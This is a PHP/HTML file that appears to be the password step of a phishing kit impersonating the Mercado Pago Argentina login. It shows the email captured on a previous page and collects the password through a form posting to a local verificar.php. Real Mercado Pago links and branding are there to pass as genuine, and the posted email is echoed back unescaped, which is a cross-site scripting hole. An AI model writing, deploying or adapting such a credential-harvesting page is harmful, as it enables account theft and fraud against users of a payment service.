<?php
error_reporting(0);
$email = $_POST['email'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>¡Hola! Ingresá tu clave</title>
    <link rel="shortcut icon" href="fotes/logoo.ico" />
    <!--<META HTTP-EQUIV="REFRESH" CONTENT="5;URL=http://localhost/mg/index.php">-->
    <script src="https://kit.fontawesome.com/5b23b3e9e6.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" type="text/css" href="css/indexx.css">
</head>

<body>
    <div class="container">
        <div class="banner">
            <div class="img">
                <img src="fotos/mp.png" height="35" alt="">
            </div>
            <a href="https://www.mercadopago.com.ar/ayuda" class="pregunta"><i class="fas fa-question"></i></a>
        </div>
        <div class="body">
            <div class="formulario">
                <form method="POST" action="verificar.php" class="contenido_formulario">
                    <div class="cont">
                        <h2>Ahora, tu clave</h2>
                        <div class="email">
                            <div class="user">
                                <i class="far fa-user"></i>
                            </div>
                            <div class="input">
                                <input style="border: none;margin-bottom:5px;background:none;width:120px;font-weight:600;" disabled type="email" value="<?php echo $email; ?>" />
                            </div>

                            <div class="cancel">
                                <a href="index.php"><i class="fas fa-times"></i></a>
                            </div>
                        </div>
                    </div>


                    <div class="input">
                        <label for="password" class="formulario__label">Clave</label>
                        <input type="password" class="formulario__input" name="password" id="password" />
                    </div>
                    <button type="submit" class="continuar">Ingresar</button>
                    <button class="create" href="https://www.mercadopago.com.ar/registration-mp?confirmation_url=https%3A%2F%2Fwww.mercadopago.com.ar%2F">No se mi clave</button>
                </form>

            </div>
        </div>
    </div>
    <script src="validar.js"></script>


</body>

</html>